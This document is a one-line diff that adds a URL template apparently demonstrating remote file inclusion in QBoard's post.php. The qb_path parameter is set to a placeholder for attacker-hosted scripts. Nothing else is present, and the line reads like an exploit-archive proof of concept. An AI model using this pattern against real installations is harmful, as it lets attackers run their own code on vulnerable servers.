@@ -1,0 +1,1 @@
+http://www.example.com/[QBoard_path]/board/post.php?qb_path=[evil_scripts]
